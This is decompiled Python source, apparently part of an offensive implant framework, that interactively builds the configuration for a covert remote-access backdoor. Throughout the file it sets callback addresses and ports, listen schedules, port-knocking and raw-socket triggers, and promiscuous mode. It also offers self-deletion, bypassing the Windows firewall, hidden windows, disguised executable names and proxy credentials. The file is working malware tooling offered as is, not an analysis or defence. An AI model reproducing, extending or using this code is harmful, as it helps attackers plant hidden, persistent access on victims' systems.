# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.10 (default, Feb  6 2017, 23:53:20) 
# [GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]
# Embedded file name: config.py
import array
import dsz
import mcl.object.IpAddr
import re

class CidrIp:

    def __init__(self, addr):
        addr = addr.split('/')
        self.ip = mcl.object.IpAddr.IpAddr.CreateFromString(addr[0])
        if len(addr) == 2:
            self.cidr = int(addr[1])
        elif self.ip.GetType() == mcl.object.IpAddr.IpAddr.IPADDR_TYPE_IPV6:
            self.cidr = 128
        else:
            self.cidr = 32

    def __str__(self):
        retval = '      <AddrSpec>\n'
        retval += '        <IP>' + str(self.ip) + '</IP>\n'
        retval += '        <Cidr>' + str(self.cidr) + '</Cidr>\n'
        retval += '      </AddrSpec>\n'
        return retval

    def __repr__(self):
        return repr(self.ip) + '/' + repr(self.cidr)

    def GetType(self):
        return self.ip.GetType()

    def GetAddr(self):
        return self.ip.GetAddr()


class PortKnockSpecification:

    def __init__(self, isCbSpec, aport, addrs, dports, sports):
        self.isCbSpec = isCbSpec
        self.aport = aport
        self.addrs = map(CidrIp, addrs)
        self.portPairs = map(None, dports, sports)
        return

    def hasCommonAddr(self, addr):
        addr = CidrIp(addr)
        for a in self.addrs:
            if a.GetType() == addr.GetType():
                useCidr = min(a.cidr, addr.cidr)
                useMask = cidrToMask(useCidr, a.GetType() == mcl.object.IpAddr.IpAddr.IPADDR_TYPE_IPV6)
                if addrToInt(a) & useMask == addrToInt(addr) & useMask:
                    return True

        return False

    def menu_str(self):
        retval = getCbOrListenString(self.isCbSpec).capitalize() + ' on ' + str(self.aport) + '\n'
        retval += '       can be triggered from ' + str(self.addrs) + ' via:\n'
        retval += '       ' + self.knockLine()
        return retval

    def __str__(self):
        retval = '    <PortKnockSpecification>\n'
        retval += '      <' + getCbOrListenString(self.isCbSpec) + '/>\n'
        retval += '      <Port>' + str(self.aport) + '</Port>\n'
        for ipSpec in self.addrs:
            retval += str(ipSpec)

        for ports in self.portPairs:
            retval += '      <PortPair>\n'
            retval += '        <DstPort>' + str(ports[0]) + '</DstPort>\n'
            portStart = ports[1].split('+')
            retval += '        <SrcStart>' + portStart[0] + '</SrcStart>\n'
            retval += '        <SrcRange>' + portStart[1] + '</SrcRange>\n'
            retval += '      </PortPair>\n'

        retval += '    </PortKnockSpecification>\n'
        return retval

    def getDPorts(self):
        return map(lambda x: x[0], self.portPairs)

    def getSPorts(self):
        return map(lambda x: x[1], self.portPairs)

    def knockLine(self):
        retval = 'knock '
        for i, ports in enumerate(self.portPairs, 1):
            portStart = ports[1].split('+')
            retval += '-k' + str(i) + ' ' + str(ports[0]) + ' '
            if portStart[0] != '0':
                retval += portStart[0] + ' '
                if portStart[1] != '0':
                    retval += portStart[1] + ' '

        return retval


class PortKnockSpecifications:

    def __init__(self):
        self.specs = []

    def append(self, isCbSpec, aport, addrs, dports, sports):
        if len(dports) != len(sports):
            return False
        for i in xrange(0, len(dports) - 1):
            if dports[i] == dports[i + 1]:
                if not goodpair(sports[i], sports[i + 1]):
                    dsz.ui.Echo('* Adjacent knocks with source range overlap: ' + sports[i] + ' and ' + sports[i + 1], dsz.ERROR)
                    return False

        for spec in self.specs:
            for addr in addrs:
                if spec.hasCommonAddr(addr):
                    specDPorts = spec.getDPorts()
                    specSPorts = spec.getSPorts()
                    if knockSubset((specDPorts, specSPorts), (dports, sports)) or knockSubset((dports, sports), (specDPorts, specSPorts)):
                        dsz.ui.Echo('* New specification incompatible with existing:\n' + str(spec), dsz.ERROR)
                        return False

        self.specs.append(PortKnockSpecification(isCbSpec, aport, addrs, dports, sports))
        return True

    def pop(self, specIdx):
        return self.specs.pop(specIdx)

    def __str__(self):
        if len(self.specs) == 0:
            return ''
        retval = '  <PortKnockSpecifications>\n'
        for spec in self.specs:
            retval += str(spec)

        retval += '  </PortKnockSpecifications>\n'
        return retval

    def __len__(self):
        return len(self.specs)


class MasterSpec:

    def __init__(self, params):
        self.parms = params
        self.unused = params
        for removeitem in ['level3', 'level4', 'i386', 'x64', 'sharedlib', 'exe', 'verbose', 'utilityburst', 'appcompat', 'winsockhelperapi', 'generic', 'driver', 'process', 'info', 'script', 'type', 'bintype', 'tcp', 'http', 'action', 'arch']:
            if self.unused.keys().count(removeitem):
                self.unused.pop(removeitem)

    def getSpecs(self):
        return self.parms

    def getUnused(self):
        return self.unused

    def getUnusedAsString(self):
        germ = ''
        for iter in self.unused.items():
            germ = germ + ' -' + iter[0] + ' ' + ' '.join(iter[1])

        return germ.lstrip()

    def parse(self, typename, option):
        restoreUnused = self.unused
        if not self.unused.has_key(option):
            return None
        else:
            mobj = self.unused[option]
            self.unused.pop(option)
            if mobj[0] == 'true':
                if typename is int:
                    return 0
                if typename is str:
                    return ''
                if typename is list:
                    return []
            if typename is list:
                return mobj
            try:
                return typename(mobj[0])
            except:
                pass

            self.unused = restoreUnused
            return None


def cidrToMask(i, ipv6=False):
    sz = 32
    if ipv6:
        sz = 128
    basis = (1 << sz) - 1
    return basis << sz - i & basis


def addrToInt(addr):
    if type(addr) == str:
        addr = mcl.object.IpAddr.IpAddr.CreateFromString(addr).GetAddr()
    else:
        addr = addr.GetAddr()
    if type(addr) == array.array:
        addr = addr.__copy__()
        addr.reverse()
        retval = 0
        while len(addr) > 0:
            retval *= 256
            retval += addr.pop()

        return retval
    else:
        return addr


def goodpair(s1, s2, zeroPairOk=True):
    s1 = map(int, s1.split('+'))
    s2 = map(int, s2.split('+'))
    if s1[0] == 0:
        return s2[0] == 0 and zeroPairOk
    else:
        if s2[0] == 0:
            return False
        return min(sum(s1), sum(s2)) < max(s1[0], s2[0])


def knockSubset(needle, haystack):
    for i in xrange(0, len(haystack[0])):
        offset = 0
        while i + offset < len(haystack[0]) and offset < len(needle[0]) and needle[0][offset] == haystack[0][i + offset] and not goodpair(needle[1][offset], haystack[1][i + offset], False):
            offset += 1

        if offset == len(needle[0]):
            return True

    return False


def ConfigurePortKnocking(isProxy, configLines):
    KS_MAX = 5
    KNOCKS_MAX = 5
    moreLines = True
    pkConfigs = PortKnockSpecifications()
    MENU_ADD_KNOCK = 'Add a new knocking specification'
    MENU_DEL_KNOCK = 'Remove a knocking specification'
    MENU_LIST_KNOCK = 'List knocking specifications'
    SRC_PORT_ZERO_SPEC = '0+0'
    menu_pks = [
     MENU_ADD_KNOCK, MENU_DEL_KNOCK, MENU_LIST_KNOCK]
    dsz.ui.Echo('Configuring port knocking specifications (' + str(KS_MAX) + ' max):')
    dsz.ui.Echo('SRC ADDR: Single IPv4 or IPv6 addresses, or add CIDR notation, e.g. 2000::/3 10.0.1.0/24')
    dsz.ui.Echo('0 will expand to 0.0.0.0/0, and :: is equivalent to ::/0.')
    dsz.ui.Echo('SRC port may be: a port, a port + range e.g. 12300+100, or 0 for OS-selected.')
    while moreLines:
        specCallback = isProxy or dsz.ui.Prompt("Respond to the following trigger via CALLBACK? (select 'no' to LISTEN when triggered)")
        usePort = 0
        activationPort = getPort('Enter the ACTIVATION port (where to ' + getCbOrListenString(specCallback) + ')', False)
        areAddressesAcquired = False
        while not areAddressesAcquired:
            addrs = dsz.ui.GetString('Enter SOURCE ADDRESSES for this trigger (5 max, space-separated)', '0 ::').split()
            if len(addrs) > 5:
                continue
            if '0' in addrs:
                addrs.remove('0')
                addrs.append('0.0.0.0/0')
            if '::' in addrs:
                addrs.remove('::')
                addrs.append('::/0')
            areAddressesAcquired = True
            for addr in addrs:
                try:
                    testset = addr.split('/')
                    if len(testset) > 2:
                        dsz.ui.Echo("* Too many slashes: '" + addr + "'", dsz.ERROR)
                        areAddressesAcquired = False
                        break
                    testaddr = mcl.object.IpAddr.IpAddr.CreateFromString(testset[0])
                    if len(testset) == 2:
                        testcidr = int(testset[1])
                        if testaddr.GetType() == mcl.object.IpAddr.IpAddr.IPADDR_TYPE_IPV4 and testcidr > 32 or testcidr > 128 or testcidr < 0:
                            dsz.ui.Echo("* Invalid CIDR bits for address type '" + testcidr + "'", dsz.ERROR)
                            areAddressesAcquired = False
                            break
                except Exception as e:
                    dsz.ui.Echo("* Invalid address '" + addr + "': " + str(e), dsz.ERROR)
                    areAddressesAcquired = False
                    break

        destPorts = []
        srcPorts = []
        preChosenSrcPort = False
        while len(destPorts) < KNOCKS_MAX:
            portPrompt = 'Enter the DST port for knock #' + str(1 + len(destPorts))
            allowDestZero = len(destPorts) > 0
            if allowDestZero:
                portPrompt += ' (0 to end input)'
            destPorts.append(getPort(portPrompt, allowDestZero))
            if destPorts[-1] == 0:
                destPorts.pop()
                break
            preChosenSrcPort = len(destPorts) > 1 and destPorts[-1] == destPorts[-2] and srcPorts[-1] == SRC_PORT_ZERO_SPEC
            areSrcPortsAcquired = preChosenSrcPort
            while not areSrcPortsAcquired:
                testPortSpec = dsz.ui.GetString('Enter the SRC port [+range] for knock #' + str(len(destPorts))).strip().replace(' ', '')
                try:
                    testset = testPortSpec.split('+')
                    if len(testset) > 2:
                        dsz.ui.Echo("* Too many plusses: '" + testPortSpec + "'", dsz.ERROR)
                        continue
                    startRange = int(testset[0])
                    rangeSize = 0
                    if len(testset) == 2:
                        rangeSize = int(testset[1])
                    if startRange < 0 or rangeSize < 0 or startRange + rangeSize > 65535:
                        dsz.ui.Echo("* Invalid SRC port(s) specification: '" + testPortSpec + "'", dsz.ERROR)
                        continue
                    elif startRange == 0:
                        if len(destPorts) > 1 and destPorts[-1] == destPorts[-2]:
                            dsz.ui.Echo("* Cannot mix zero SRC port with nonzero when dest is the same: '" + testPortSpec + "'", dsz.ERROR)
                            continue
                        srcPorts.append(SRC_PORT_ZERO_SPEC)
                    else:
                        srcPorts.append(str(startRange) + '+' + str(rangeSize))
                    areSrcPortsAcquired = True
                except:
                    dsz.ui.Echo("* Invalid SRC port(s) specification: '" + testPortSpec + "'", dsz.ERROR)

            if preChosenSrcPort:
                dsz.ui.Echo('... This source port spec must be 0, auto-filling.')
                srcPorts.append(SRC_PORT_ZERO_SPEC)

        if not pkConfigs.append(specCallback, activationPort, addrs, destPorts, srcPorts):
            dsz.ui.Echo('* Invalid trigger specification!', dsz.ERROR)
        if len(pkConfigs) == KS_MAX and MENU_ADD_KNOCK in menu_pks:
            menu_pks.remove(MENU_ADD_KNOCK)
        choice = ''
        while len(choice) == 0:
            if len(pkConfigs) == 0:
                dsz.ui.Echo('Must have at least one valid specification, forcing add.')
                moreLines = True
                break
            choice = dsz.menu.ExecuteSimpleMenu('Select from the following', menu_pks)[0]
            if choice == MENU_ADD_KNOCK:
                moreLines = True
            elif choice == MENU_DEL_KNOCK:
                menu_del = list()
                for pk in pkConfigs.specs:
                    menu_del.append(pk.menu_str())

                ignored, delIdx = dsz.menu.ExecuteSimpleMenu('Remove which?', menu_del)
                if delIdx != -1:
                    pkConfigs.pop(delIdx)
                choice = ''
            elif choice == MENU_LIST_KNOCK:
                dsz.ui.Echo("Trigger by pasting a 'knock' line (appending the target's IP address):")
                for pk in pkConfigs.specs:
                    dsz.ui.Echo(pk.menu_str() + '-dest ')

                dsz.ui.Echo('\n')
                choice = ''
            else:
                moreLines = False
                break
            if len(pkConfigs) < KS_MAX and MENU_ADD_KNOCK not in menu_pks:
                menu_pks.insert(0, MENU_ADD_KNOCK)

    configLines.extend(str(pkConfigs).splitlines(True))


def fixStringForXml(origStr):
    newStr = origStr
    if len(newStr) > 0:
        newStr = re.sub('&', '&amp;', newStr)
        newStr = re.sub('<', '&lt;', newStr)
        newStr = re.sub('>', '&gt;', newStr)
    return newStr


def getCbOrListenString(specCallback):
    if specCallback:
        return 'callback'
    else:
        return 'listen'


def getPort(prompt, allowZero=True, default=''):
    lowerBound = 0
    retval = -1
    if not allowZero:
        lowerBound = 1
    while retval == -1:
        retval = dsz.ui.GetInt(prompt, default)
        if retval < lowerBound or retval > 65535:
            retval = -1
            dsz.ui.Echo('* Invalid port value (must be between ' + str(lowerBound) + ' and 65535)', dsz.ERROR)

    return retval


def isLevel3(type):
    return type.lower() == 'level3'


def SetCallbackInfo(isL3, advanced, masterspec):
    configLines = list()
    callbackAddr = masterspec.parse(str, 'calladdr')
    if isL3:
        if callbackAddr is None:
            callbackAddr = '127.0.0.1'
            addr = dsz.ui.GetString('Enter the callback address (127.0.0.1 = no callback)', callbackAddr)
        elif callbackAddr != '':
            addr = callbackAddr
        else:
            addr = '127.0.0.1'
        while type(callbackAddr) == str:
            try:
                callbackAddr = mcl.object.IpAddr.IpAddr.CreateFromString(addr)
            except:
                callbackAddr = '127.0.0.1'
                addr = dsz.ui.GetString("Invalid callback address '" + addr + "'. Enter the callback address", callbackAddr)

        configLines.append('  <CallbackAddress>%s</CallbackAddress>\n' % addr)
    else:
        callbackAddr = '127.0.0.1'
    if advanced or str(callbackAddr) != '127.0.0.1':
        callbackPorts = masterspec.parse(list, 'callport')
        try:
            if callbackPorts is not None:
                if len(callbackPorts) % 2 == 1:
                    dsz.ui.Echo('* Unused port value at end of callback ports (must specify a src for EVERY dst)', dsz.WARNING)
                    callbackPorts = callbackPorts[:-1]
                callbackPorts = map(int, callbackPorts)
                for i in xrange(0, len(callbackPorts), 2):
                    if callbackPorts[i] <= 0 or callbackPorts[i] > 65535 or callbackPorts[i + 1] < 0 or callbackPorts[i + 1] > 65535:
                        dsz.ui.Echo('* Invalid port value in callback ports (must be between 0 and 65535)', dsz.ERROR)
                        callbackPorts = None
                        break

        except:
            dsz.ui.Echo('* Non-integer port value in callback ports', dsz.ERROR)
            callbackPorts = None

        if callbackPorts is None and dsz.ui.Prompt('Change CALLBACK PORTS?', False) or callbackPorts is not None and len(callbackPorts) in xrange(2, 13, 2):
            configLines.append('  <CallbackPorts>\n')
            if callbackPorts is None:
                callbackPorts = []
                numPorts = 0
                while numPorts < 6:
                    dstPort = getPort('Enter callback DST port (0=no more ports)')
                    if dstPort == 0:
                        break
                    srcPort = getPort('Enter callback SRC port', default='0')
                    if dstPort < 0 or dstPort > 65535 or srcPort < 0 or srcPort > 65535:
                        dsz.ui.Echo('* Invalid port value (must be between 0 and 65535)', dsz.ERROR)
                    else:
                        callbackPorts.append(dstPort)
                        callbackPorts.append(srcPort)
                        numPorts += 1

            for i in xrange(0, len(callbackPorts), 2):
                configLines.append('    <CallbackPair>\n')
                configLines.append('      <SrcPort>%u</SrcPort>\n' % callbackPorts[i + 1])
                configLines.append('      <DstPort>%u</DstPort>\n' % callbackPorts[i])
                configLines.append('    </CallbackPair>\n')

            configLines.append('  </CallbackPorts>\n')
    return configLines


def SetFlags(isL3, isExe, isProxy, advanced, masterspec):
    configLines = list()
    configLines.append('  <Flags>\n')
    doPortKnocking = False
    if isL3:
        if masterspec.parse(str, 'imm') is not None or masterspec.parse(str, 'noimm') is None and dsz.ui.Prompt('Perform IMMEDIATE CALLBACK?', isProxy):
            configLines.append('    <PCHEAP_CONFIG_FLAG_CALLBACK_NOW/>\n')
        if isExe and (masterspec.parse(str, 'qdel') is not None or masterspec.parse(str, 'noqdel') is None and dsz.ui.Prompt('Enable QUICK SELF-DELETION?', False)):
            configLines.append('    <PCHEAP_CONFIG_FLAG_QUICK_DELETE_SELF/>\n')
    else:
        if not isProxy and dsz.ui.Prompt('Listen AT ALL TIMES?', False):
            configLines.append('    <PCHEAP_CONFIG_FLAG_24_HOUR/>\n')
        if dsz.ui.Prompt('Allow triggering via a raw socket? '):
            configLines.append('    <PCHEAP_CONFIG_FLAG_RAW_SOCKET_TRIGGER/>\n')
            if dsz.ui.Prompt('Allow fallback to promiscuous mode on that raw socket? ', False):
                configLines.append('    <PCHEAP_CONFIG_FLAG_ALLOW_PROMISC_MODE/>\n')
        if dsz.ui.Prompt('Disable comms between PC and driver?', False):
            configLines.append('    <PCHEAP_CONFIG_FLAG_DISABLE_DRIVER_COMMS/>\n')
        if dsz.ui.Prompt('Allow triggering via port knocking?', False):
            configLines.append('    <PCHEAP_CONFIG_FLAG_PORT_KNOCK_TRIGGER/>\n')
            doPortKnocking = True
        if advanced:
            if dsz.ui.Prompt('Disable shared status memory creation?', False):
                configLines.append('    <PCHEAP_CONFIG_FLAG_DONT_CREATE_SECTION/>\n')
    if advanced and (masterspec.parse(str, 'nofire') is not None or masterspec.parse(str, 'fire') is None and not dsz.ui.Prompt('Update the Windows firewall when listening?')):
        configLines.append('    <PCHEAP_CONFIG_FLAG_IGNORE_WIN_FIREWALL/>\n')
    if not isExe or advanced and (masterspec.parse(str, 'nowind') is not None or masterspec.parse(str, 'wind') is None and dsz.ui.Prompt('Disable window creation?', not isExe)):
        configLines.append('    <PCHEAP_CONFIG_FLAG_DONT_CREATE_WINDOW/>\n')
    configLines.append('  </Flags>\n')
    if doPortKnocking:
        ConfigurePortKnocking(isProxy, configLines)
    return configLines


def SetId(masterspec):
    configLines = list()
    id = masterspec.parse(int, 'pcid')
    if id is None:
        id = 9223372036854775807L
    while id == 9223372036854775807L:
        id = dsz.ui.GetInt('Enter the PC ID', '0')

    configLines.append('  <Id>0x%x</Id>\n' % id)
    return configLines


def SetListenInfo(isL3, isProxy, existingConfigLines, advanced, masterspec):
    configLines = list()
    if isProxy or masterspec.parse(str, 'nolisten') is not None:
        return configLines
    else:
        listenHours = masterspec.parse(list, 'listen')
        listenQuiet = listenHours is not None
        listenAddr = masterspec.parse(list, 'laddr')
        listenPorts = masterspec.parse(list, 'lport')
        askForListenHours = True
        askForListenPorts = True
        if isL3:
            listenLoops = masterspec.parse(list, 'loops')
            listenDuration = masterspec.parse(list, 'ldur')
            if advanced:
                if listenLoops is not None or not listenQuiet and dsz.ui.Prompt('Change the number of LISTEN LOOPS?', False):
                    loops = 0
                    if listenLoops is not None:
                        loops = listenLoops
                    while loops <= 0 or loops > 36:
                        loops = dsz.ui.GetInt('Enter the number of listen loops', '6')

                    configLines.append('  <ListenLoops>%u</ListenLoops>\n' % loops)
                if listenDuration is not None or not listenQuiet and dsz.ui.Prompt('Change the LISTEN DURATION per loop?', False):
                    duration = 0
                    if listenDuration is not None:
                        duration = listenDuration
                    while duration <= 0 or duration > 3600:
                        duration = dsz.ui.GetInt('Enter the listen duration (in seconds; max 3600)', '300')

                    configLines.append('  <ListenDuration>%u</ListenDuration>\n' % duration)
            else:
                askForListenHours = False
            if not listenQuiet and not dsz.ui.Prompt('Do you want to LISTEN?', True):
                askForListenHours = False
                askForListenPorts = False
                configLines.append('  <StartListenHour>0</StartListenHour>\n')
                configLines.append('  <StopListenHour>0</StopListenHour>\n')
        else:
            for line in existingConfigLines:
                if 'PCHEAP_CONFIG_FLAG_24_HOUR' in line:
                    askForListenHours = False
                    break

        if askForListenHours:
            start = -1
            stop = -1
            if listenQuiet:
                if len(listenHours) == 2:
                    start = int(listenHours[0])
                    stop = int(listenHours[1])
                else:
                    stop = 24
                    if len(listenHours) == 1:
                        dsz.ui.Echo('Ignoring listen hour argument, need start AND stop', dsz.WARNING)
            elif dsz.ui.Prompt('Change the LISTEN HOURS?', False):
                while start == -1:
                    start = dsz.ui.GetInt('Enter the starting hour (0-24)')
                    if start < 0 or start > 24:
                        start = -1

                while stop == -1:
                    stop = dsz.ui.GetInt('Enter the ending hour (0-24)')
                    if stop < 0 or stop > 24:
                        stop = -1

            if start != -1 and stop != -1:
                configLines.append('  <StartListenHour>%u</StartListenHour>\n' % start)
                configLines.append('  <StopListenHour>%u</StopListenHour>\n' % stop)
            if start == stop:
                askForListenPorts = False
        if askForListenPorts:
            if listenPorts is not None and len(listenPorts) > 0 or not listenQuiet and dsz.ui.Prompt('Change LISTEN PORTS?', False):
                configLines.append('  <ListenPorts>\n')
                if listenPorts is not None and len(listenPorts) > 0:
                    for port in listenPorts:
                        configLines.append('    <BindPort>' + port + '</BindPort>\n')

                else:
                    numPorts = 0
                    while numPorts < 6:
                        port = getPort('Enter listening port (0=no more ports)')
                        if port == 0:
                            break
                        else:
                            configLines.append('    <BindPort>%u</BindPort>\n' % port)
                            numPorts = numPorts + 1

                configLines.append('  </ListenPorts>\n')
        if advanced:
            if listenAddr is not None or not listenQuiet and dsz.ui.Prompt('Change LISTEN BIND ADDRESS', False):
                if listenAddr != '':
                    bindAddr = ''
                    if listenAddr is not None:
                        bindAddr = listenAddr
                    while type(bindAddr) == str:
                        try:
                            bindAddr = mcl.object.IpAddr.IpAddr.CreateFromString(bindAddr)
                        except:
                            bindAddr = dsz.ui.GetString('Enter the listen bind address', '0.0.0.0')

                    configLines.append('  <ListenBindAddress>%s</ListenBindAddress>\n' % bindAddr)
        return configLines


def SetMiscInfo(isL3, isUtbu, driverName, procName, infoValue, advanced, masterspec):
    configLines = list()
    if isL3:
        newName = masterspec.parse(str, 'exename')
        if newName != '' and (newName is not None or dsz.ui.Prompt('Change exe name in version information?', False)):
            origName = 'ntpartrl.exe'
            while newName is None or len(newName) < 5 or len(newName) > 120:
                dsz.ui.Echo('Name length must be between 5 and 120 characters')
                newName = dsz.ui.GetString('Enter the new name', origName)

            configLines.append('  <InternalName>%s</InternalName>\n' % fixStringForXml(newName))
            configLines.append('  <OriginalFilename>%s</OriginalFilename>\n' % fixStringForXml(newName))
    else:
        if len(driverName) > 0:
            configLines.append('  <DriverName>%s</DriverName>\n' % fixStringForXml(driverName))
        elif advanced and dsz.ui.Prompt('Change the TRIGGER DRIVER NAME?', False):
            name = dsz.ui.GetString('Enter the TRIGGER DRIVER NAME')
            configLines.append('  <DriverName>%s</DriverName>\n' % fixStringForXml(name))
        if len(procName) > 0:
            configLines.append('  <ProcessName>%s</ProcessName>\n' % fixStringForXml(procName))
        elif advanced and dsz.ui.Prompt('Change the PROCESS NAME?', False):
            name = dsz.ui.GetString('Enter the PROCESS NAME')
            configLines.append('  <ProcessName>%s</ProcessName>\n' % fixStringForXml(name))
        if len(infoValue) > 0:
            configLines.append('  <InfoValue>%s</InfoValue>\n' % fixStringForXml(infoValue))
        elif advanced and isUtbu and dsz.ui.Prompt('Change the INFO VALUE?', False):
            value = dsz.ui.GetString('Enter the INFO VALUE')
            configLines.append('  <InfoValue>%s</InfoValue>\n' % fixStringForXml(value))
    return configLines


def SetProxyConfig(isProxy, advanced, masterspec):
    configLines = list()
    if advanced and isProxy:
        addr = masterspec.parse(str, 'proxyaddr')
        port = masterspec.parse(int, 'proxyport')
        login = masterspec.parse(str, 'proxyuser')
        passwd = masterspec.parse(str, 'proxypass')
        maxDataPerSend = masterspec.parse(int, 'maxdata')
        waitTimeAfterFailure = masterspec.parse(int, 'failwait')
        waitTimeBetweenSends = masterspec.parse(int, 'sendwait')
        maxSendFailures = masterspec.parse(int, 'maxfail')
        pcpQuiet = masterspec.parse(str, 'pcp') is not None
        if addr is not None or port is not None or not pcpQuiet and dsz.ui.Prompt('Set the proxy address?', False):
            while True:
                if addr is None:
                    addr = dsz.ui.GetString('Enter the PROXY ADDRESS')
                if port is None:
                    port = dsz.ui.GetInt('Enter the PROXY PORT')
                if port > 0 and port < 65535:
                    configLines.append('  <ProxyAddress>%s</ProxyAddress>\n' % addr)
                    configLines.append('  <ProxyPort>%u</ProxyPort>\n' % port)
                    break
                port = None

        if login is not None or passwd is not None or not pcpQuiet and dsz.ui.Prompt('Set the proxy login?', False):
            if login is None:
                login = dsz.ui.GetString('Enter the PROXY USERNAME')
            if passwd is None:
                passwd = dsz.ui.GetString('Enter the PROXY PASSWORD')
            configLines.append('  <ProxyUser>%s</ProxyUser>\n' % fixStringForXml(login))
            configLines.append('  <ProxyPassword>%s</ProxyPassword>\n' % fixStringForXml(passwd))
        if pcpQuiet or dsz.ui.Prompt('Set the proxy connection parameters?', False):
            while True:
                if maxDataPerSend is not None or not pcpQuiet and dsz.ui.Prompt('Change the default MAXIMUM DATA SEND SIZE?', False):
                    if maxDataPerSend is None:
                        maxDataPerSend = dsz.ui.GetInt('Enter the MAXIMUM DATA SEND SIZE')
                    if maxDataPerSend >= 1024 and maxDataPerSend < 65535:
                        configLines.append('  <MaxDataPerSend>%u</MaxDataPerSend>\n' % maxDataPerSend)
                        break
                    else:
                        dsz.ui.Echo('* Valid values for MAXIMUM DATA SEND SIZE are 1024 - 65534')
                        maxDataPerSend = None
                else:
                    break

            while True:
                if waitTimeAfterFailure is not None or not pcpQuiet and dsz.ui.Prompt('Change the default WAIT TIME AFTER FAILURE?', False):
                    if waitTimeAfterFailure is None:
                        waitTimeAfterFailure = dsz.ui.GetInt('Enter the WAIT TIME AFTER FAILURE (in seconds)')
                    if waitTimeAfterFailure > 0 and waitTimeAfterFailure < 65535:
                        configLines.append('  <WaitTimeAfterFailure>%u</WaitTimeAfterFailure>\n' % waitTimeAfterFailure)
                        break
                    else:
                        dsz.ui.Echo('* Valid values for WAIT TIME AFTER FAILURE are 1 - 65534')
                        waitTimeAfterFailure = None
                else:
                    break

            while True:
                if waitTimeBetweenSends is not None or not pcpQuiet and dsz.ui.Prompt('Change the default WAIT TIME BETWEEN SENDS?', False):
                    if waitTimeBetweenSends is None:
                        waitTimeBetweenSends = dsz.ui.GetInt('Enter the WAIT TIME BETWEEN SENDS (in seconds)')
                    if waitTimeBetweenSends > 0 and waitTimeBetweenSends < 65535:
                        configLines.append('  <WaitTimeBetweenSends>%u</WaitTimeBetweenSends>\n' % waitTimeBetweenSends)
                        break
                    else:
                        dsz.ui.Echo('* Valid values for WAIT TIME BETWEEN SENDS are 1 - 65534')
                        waitTimeBetweenSends = None
                else:
                    break

            while True:
                if maxSendFailures is not None or not pcpQuiet and dsz.ui.Prompt('Change the default MAXIMUM SEND FAILURES?', False):
                    maxSendFailures = dsz.ui.GetInt('Enter the MAXIMUM SEND FAILURES')
                    if maxSendFailures > 0 and maxSendFailures < 65535:
                        configLines.append('  <MaximumSendFailures>%u</MaximumSendFailures>\n' % maxSendFailures)
                        break
                    else:
                        dsz.ui.Echo('* Valid values for MAXIMUM SEND FAILURES are 1 - 65534')
                        maxSendFailures = None
                else:
                    break

    return configLines